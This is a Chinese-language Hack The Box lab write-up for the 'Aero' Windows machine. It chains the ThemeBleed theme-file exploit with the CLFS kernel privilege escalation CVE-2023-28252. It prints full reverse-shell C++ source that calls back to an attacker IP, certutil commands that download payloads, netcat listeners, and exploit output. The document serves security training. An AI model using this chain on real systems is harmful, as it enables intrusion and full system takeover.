---
title: HTB-Aero Writeup
date: 2026-09-28T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - ThemeBleed
  - CVE-2023-38146
  - CVE-2023-28252
  - CLFS
  - 提权
---
## Nmap 探索

使用 Nmap 对目标进行全端口扫描，只发现 80 端口开放。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero]
└─$ sudo nmap --min-rate 10000 -p- 10.129.229.128 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-27 22:20 -0400
Nmap scan report for 10.129.229.128
Host is up (0.13s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.27 seconds
┌──(kali㉿kali)-[~/Work/Kali/Aero]
└─$ sudo nmap --min-rate 10000 -sN -p- 10.129.229.128 -oA Nmap/ports
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-27 22:21 -0400
Nmap scan report for 10.129.229.128
Host is up (0.12s latency).
All 65535 scanned ports on 10.129.229.128 are in ignored states.
Not shown: 65535 open|filtered tcp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 14.71 seconds
```

对 80 端口做系统与版本指纹探测，初步判断是 Windows 主机。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero]
└─$ sudo nmap -sT -O -p 80 10.129.229.128
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-27 22:22 -0400
Nmap scan report for 10.129.229.128
Host is up (0.12s latency).

PORT   STATE SERVICE
80/tcp open  http
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows 11 21H2 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.08 seconds
```

访问首页，站点是一个 Windows 11 主题仓库，页面底部提供主题文件上传功能（只接受 .theme 与 .themepack）。

![](Pasted%20image%2020260928112651.png)

## ThemeBleed 漏洞利用（CVE-2023-38146）

站点是 Windows 11 主题仓库，结合 2023 年公开的 Windows 主题 RCE 漏洞 ThemeBleed，克隆对应的 PoC 仓库。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero]                                                                                                                                      
└─$ git clone -q --depth 1 https://github.com/Jnnshschl/CVE-2023-38146.git themebleed                                                                                   
 
```

创建虚拟环境并安装依赖。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero/themebleed]
└─$ python3 -m venv ve                                                   
┌──(kali㉿kali)-[~/Work/Kali/Aero/themebleed]
└─$ source ve/bin/activate
┌──(ve)─(kali㉿kali)-[~/Work/Kali/Aero/themebleed]
└─$ pip install -r requirements.txt
Collecting cabarchive (from -r requirements.txt (line 1))
  Using cached cabarchive-0.2.5-py3-none-any.whl.metadata (933 bytes)
Collecting impacket (from -r requirements.txt (line 2))
  Using cached impacket-0.13.1-py3-none-any.whl.metadata (6.0 kB)
Collecting pyasn1>=0.2.3 (from impacket->-r requirements.txt (line 2))
  Using cached pyasn1-0.6.4-py3-none-any.whl.metadata (8.4 kB)
Collecting pyasn1_modules (from impacket->-r requirements.txt (line 2))
  Using cached pyasn1_modules-0.4.2-py3-none-any.whl.metadata (3.5 kB)
Collecting pycryptodomex (from impacket->-r requirements.txt (line 2))
  Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Collecting pyOpenSSL (from impacket->-r requirements.txt (line 2))
  Using cached pyopenssl-26.4.0-py3-none-any.whl.metadata (22 kB)
Collecting six (from impacket->-r requirements.txt (line 2))
  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 (from impacket->-r requirements.txt (line 2))
  Using cached ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
Collecting ldapdomaindump>=0.9.0 (from impacket->-r requirements.txt (line 2))
  Using cached ldapdomaindump-0.10.0-py3-none-any.whl.metadata (512 bytes)
Collecting flask>=1.0 (from impacket->-r requirements.txt (line 2))
  Using cached flask-3.1.3-py3-none-any.whl.metadata (3.2 kB)
Collecting charset_normalizer (from impacket->-r requirements.txt (line 2))
  Using cached charset_normalizer-3.5.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (45 kB)
Collecting blinker>=1.9.0 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
Collecting click>=8.1.3 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached click-8.5.0-py3-none-any.whl.metadata (2.6 kB)
Collecting itsdangerous>=2.2.0 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
Collecting jinja2>=3.1.2 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
Collecting markupsafe>=2.1.1 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (2.7 kB)
Collecting werkzeug>=3.1.0 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached werkzeug-3.1.9-py3-none-any.whl.metadata (4.1 kB)
Collecting dnspython (from ldapdomaindump>=0.9.0->impacket->-r requirements.txt (line 2))
  Using cached dnspython-2.8.0-py3-none-any.whl.metadata (5.7 kB)
Collecting cryptography<51,>=49.0.0 (from pyOpenSSL->impacket->-r requirements.txt (line 2))
  Using cached cryptography-50.0.1-cp311-abi3-manylinux_2_34_x86_64.whl.metadata (4.3 kB)
Collecting cffi>=2.0.0 (from cryptography<51,>=49.0.0->pyOpenSSL->impacket->-r requirements.txt (line 2))
  Using cached cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.5 kB)
Collecting pycparser (from cffi>=2.0.0->cryptography<51,>=49.0.0->pyOpenSSL->impacket->-r requirements.txt (line 2))
  Using cached pycparser-3.0-py3-none-any.whl.metadata (8.2 kB)
Using cached cabarchive-0.2.5-py3-none-any.whl (28 kB)
Using cached impacket-0.13.1-py3-none-any.whl (1.8 MB)
Using cached flask-3.1.3-py3-none-any.whl (103 kB)
Using cached blinker-1.9.0-py3-none-any.whl (8.5 kB)
Using cached click-8.5.0-py3-none-any.whl (125 kB)
Using cached itsdangerous-2.2.0-py3-none-any.whl (16 kB)
Using cached jinja2-3.1.6-py3-none-any.whl (134 kB)
Using cached ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
Using cached ldapdomaindump-0.10.0-py3-none-any.whl (19 kB)
Using cached markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (22 kB)
Using cached pyasn1-0.6.4-py3-none-any.whl (84 kB)
Using cached werkzeug-3.1.9-py3-none-any.whl (228 kB)
Using cached charset_normalizer-3.5.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (250 kB)
Using cached dnspython-2.8.0-py3-none-any.whl (331 kB)
Using cached pyasn1_modules-0.4.2-py3-none-any.whl (181 kB)
Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Using cached pyopenssl-26.4.0-py3-none-any.whl (56 kB)
Using cached cryptography-50.0.1-cp311-abi3-manylinux_2_34_x86_64.whl (4.7 MB)
Using cached cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (221 kB)
Using cached pycparser-3.0-py3-none-any.whl (48 kB)
Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
Installing collected packages: cabarchive, six, pycryptodomex, pycparser, pyasn1, markupsafe, itsdangerous, dnspython, click, charset_normalizer, blinker, werkzeug, pyasn1_modules, ldap3, jinja2, cffi, ldapdomaindump, flask, cryptography, pyOpenSSL, impacket
Successfully installed blinker-1.9.0 cabarchive-0.2.5 cffi-2.1.1 charset_normalizer-3.5.1 click-8.5.0 cryptography-50.0.1 dnspython-2.8.0 flask-3.1.3 impacket-0.13.1 itsdangerous-2.2.0 jinja2-3.1.6 ldap3-2.9.1 ldapdomaindump-0.10.0 markupsafe-3.0.3 pyOpenSSL-26.4.0 pyasn1-0.6.4 pyasn1_modules-0.4.2 pycparser-3.0 pycryptodomex-3.23.0 six-1.17.0 werkzeug-3.1.9
```

启动 PoC，它会自动编译反弹 shell DLL、生成恶意主题文件，并在本机 445 端口启动 SMB 服务。

```bash
┌──(ve)─(kali㉿kali)-[~/Work/Kali/Aero/themebleed]
└─$ sudo .venv/bin/python3 themebleed.py -r 10.10.16.151 -p 4711
2026-09-27 23:30:21,501 INFO> ThemeBleed CVE-2023-38146 PoC [https://github.com/Jnnshschl]
2026-09-27 23:30:21,501 INFO> Credits to -> https://github.com/gabe-k/themebleed, impacket and cabarchive

2026-09-27 23:30:22,154 INFO> Compiled DLL: "./tb/Aero.msstyles_vrf_evil.dll"
2026-09-27 23:30:22,155 INFO> Theme generated: "evil_theme.theme"
2026-09-27 23:30:22,155 INFO> Themepack generated: "evil_theme.themepack"

2026-09-27 23:30:22,155 INFO> Remember to start netcat: rlwrap -cAr nc -lvnp 4711
2026-09-27 23:30:22,155 INFO> Starting SMB server: 10.10.16.151:445

2026-09-27 23:30:22,155 INFO> Config file parsed
2026-09-27 23:30:22,155 DEBUG> Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2026-09-27 23:30:22,155 DEBUG> Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2026-09-27 23:30:22,155 INFO> Config file parsed
2026-09-27 23:30:22,156 INFO> Config file parsed
```

确认恶意主题文件已经生成。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero/themebleed]
└─$ ls -liah evil_theme.theme*
4357117 -rw-r--r-- 1 root root 370 Sep 27 23:30 evil_theme.theme
4357119 -rw-r--r-- 1 root root 455 Sep 27 23:30 evil_theme.themepack
```

开启监听，把主题文件上传到站点，靶机应用主题后回连成功，拿到 sam.emerson 的 shell。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero]
└─$ sudo rlwrap -cAr nc -lvnp 4711
[sudo] password for kali: 
listening on [any] 4711 ...
id
connect to [10.10.16.151] from (UNKNOWN) [10.129.229.128] 64725
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> id
id : The term 'id' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the 
spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
PS C:\Windows\system32> whoami
whoami
aero\sam.emerson

```

## 提权枚举

确认当前身份与权限，只有普通用户权限，没有任何可利用的令牌特权。

```bash
PS C:\Users\sam.emerson\Desktop> whoami /all
whoami /all

USER INFORMATION
----------------

User Name        SID                                           
================ ==============================================
aero\sam.emerson S-1-5-21-3555993375-1320373569-1431083245-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

查看用户目录，发现提权提示文件 CVE-2023-28252_Summary.pdf，以及负责「测试」上传主题的看门狗脚本 watchdog.ps1。

```bash
PS C:\Users\sam.emerson\Documents> dir
dir


    Directory: C:\Users\sam.emerson\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/21/2023   9:18 AM          14158 CVE-2023-28252_Summary.pdf                                           
-a----         9/26/2023   1:06 PM           1113 watchdog.ps1
```

## CVE-2023-28252 提权（CLFS）

按提示定位到 CLFS 驱动的内核提权漏洞 CVE-2023-28252，克隆公开的 PoC 仓库。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero]
└─$ git clone --depth 1 https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git
Cloning into 'CVE-2023-28252-Compiled-exe'...
remote: Enumerating objects: 41, done.
remote: Counting objects: 100% (41/41), done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 41 (delta 4), reused 38 (delta 4), pack-reused 0 (from 0)
Receiving objects: 100% (41/41), 1.79 MiB | 1.01 MiB/s, done.
Resolving deltas: 100% (4/4), done.
```

写一个带日志的 payload。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero/privesc]
└─$ cat rev2.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>

#define LOGP "C:\\Users\\Public\\rev.log"

static void lg(const char* fmt, ...) {
    FILE* f = fopen(LOGP, "a");
    if (!f) return;
    va_list ap; va_start(ap, fmt); vfprintf(f, fmt, ap); va_end(ap);
    fprintf(f, "\n"); fflush(f); fclose(f);
}

int main() {
    lg("=== rev2 start pid=%lu ===", (unsigned long)GetCurrentProcessId());
    WSADATA w;
    lg("WSAStartup=%d", WSAStartup(MAKEWORD(2,2), &w));

    struct addrinfo h; ZeroMemory(&h, sizeof(h));
    h.ai_family = AF_UNSPEC; h.ai_socktype = SOCK_STREAM; h.ai_protocol = IPPROTO_TCP;
    struct addrinfo* ai = NULL;
    int gr = getaddrinfo("10.10.16.151", "4444", &h, &ai);
    lg("getaddrinfo=%d", gr);
    if (gr != 0 || ai == NULL) return 1;

    SOCKET s = WSASocketW(ai->ai_family, ai->ai_socktype, ai->ai_protocol, NULL, 0, 0);
    lg("socket handle=%lu", (unsigned long)s);
    if (s == INVALID_SOCKET) { lg("socket fail err=%lu", (unsigned long)WSAGetLastError()); return 1; }
    int cr = WSAConnect(s, ai->ai_addr, (int)ai->ai_addrlen, NULL, NULL, NULL, NULL);
    lg("WSAConnect=%d err=%lu", cr, (unsigned long)WSAGetLastError());
    if (cr == SOCKET_ERROR) return 1;

    const char* bins[2] = {
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\cmd.exe"
    };
    for (int i = 0; i < 2; i++) {
        STARTUPINFOA si; ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = (HANDLE)s; si.hStdOutput = (HANDLE)s; si.hStdError = (HANDLE)s;
        PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
        char cmd[512]; strcpy(cmd, bins[i]);
        BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        lg("CreateProcess(%s)=%d err=%lu", bins[i], (int)ok, (unsigned long)GetLastError());
        if (ok) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            lg("child exited");
            break;
        }
    }
    return 0;
}
```

交叉编译成 Windows x64 可执行文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero]
└─$ x86_64-w64-mingw32-g++ rev2.cpp -o rev2.exe -lws2_32
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Aero]
└─$ file rev.exe 
rev.exe: PE32+ executable for MS Windows 5.02 (console), x86-64, 18 sections
```

把 PoC 与 payload 一起下载到靶机。

```bash
PS C:\Users\sam.emerson\Documents> certutil -urlcache -f http://10.10.16.151:8000/exploit.exe exploit.exe
certutil -urlcache -f http://10.10.16.151:8000/exploit.exe exploit.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\sam.emerson\Documents> certutil -urlcache -f http://10.10.16.151:8000/rev.exe rev.exe
certutil -urlcache -f http://10.10.16.151:8000/rev.exe rev.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\sam.emerson\Documents> dir
dir


    Directory: C:\Users\sam.emerson\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/21/2023   9:18 AM          14158 CVE-2023-28252_Summary.pdf                                           
-a----         9/28/2026  12:20 AM         367104 exploit.exe                                                          
-a----         9/28/2026  12:21 AM         121111 rev.exe                                                              
-a----         9/26/2023   1:06 PM           1113 watchdog.ps1 
```

以 1208（即 0x4b8）令牌偏移执行 PoC，成功窃取 SYSTEM 令牌并执行我们的 payload。

```bash
PS C:\Users\sam.emerson\Documents> .\exploit.exe 1208 1 "C:\Users\sam.emerson\Documents\rev2.exe"                                                                        
.\exploit.exe 1208 1 "C:\Users\sam.emerson\Documents\rev.exe"                                                                                                           
Executing command: C:\Users\sam.emerson\Documents\rev.exe                                                                                                               
                                                                                                                                                                        
                                                                                                                                                                        
ARGUMENTS                                                                                                                                                               
[+] TOKEN OFFSET 4b8                                                                                                                                                    
[+] FLAG 1                                                                                                                                                              
                                                                                                                                                                        
                                                                                                                                                                        
VIRTUAL ADDRESSES AND OFFSETS                                                                                                                                           
[+] NtFsControlFile Address --> 00007FFE5A6A4240                                                                                                                        
[+] pool NpAt VirtualAddress -->FFFFD686027FE000                                                                                                                        
[+] MY EPROCESSS FFFFE7036F6ED1C0                                                                                                                                       
[+] SYSTEM EPROCESSS FFFFE703696A4040
[+] _ETHREAD ADDRESS FFFFE7036C8BB080
[+] PREVIOUS MODE ADDRESS FFFFE7036C8BB2B2
[+] Offset ClfsEarlierLsn --------------------------> 0000000000013220
[+] Offset ClfsMgmtDeregisterManagedClient --------------------------> 000000000002BFB0
[+] Kernel ClfsEarlierLsn --------------------------> FFFFF80007053220
[+] Kernel ClfsMgmtDeregisterManagedClient --------------------------> FFFFF8000706BFB0
[+] Offset RtlClearBit --------------------------> 0000000000343010
[+] Offset PoFxProcessorNotification --------------------------> 00000000003DBD00
[+] Offset SeSetAccessStateGenericMapping --------------------------> 00000000009C87B0
[+] Kernel RtlClearBit --------------------------> FFFFF80005F43010
[+] Kernel SeSetAccessStateGenericMapping --------------------------> FFFFF800065C87B0

[+] Kernel PoFxProcessorNotification --------------------------> FFFFF80005FDBD00


PATHS
[+] Folder Public Path = C:\Users\Public
[+] Base log file name path= LOG:C:\Users\Public\66
[+] Base file path = C:\Users\Public\66.blf
[+] Container file name path = C:\Users\Public\.p_66
Last kernel CLFS address = FFFFD685F1814000
numero de tags CLFS founded 9

Last kernel CLFS address = FFFFD685F6BCE000
numero de tags CLFS founded 

[+] Log file handle: 0000000000000124
[+] Pool CLFS kernel address: FFFFD685F6BCE000

number of pipes created =5000

number of pipes created =4000
TRIGGER START
System_token_value: FFFFD685EEE654FF
SYSTEM TOKEN CAPTURED
Closing Handle
ACTUAL USER=SYSTEM
WE ARE SYSTEM
Executing command: C:\Users\sam.emerson\Documents\rev2.exe

```

再次监听，这次收到 SYSTEM 权限的 shell。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Aero]
└─$ sudo rlwrap -cAr nc -lvknp 4444
listening on [any] 4444 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.229.128] 64756
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\sam.emerson\Documents> whoami
whoami
nt authority\system
```
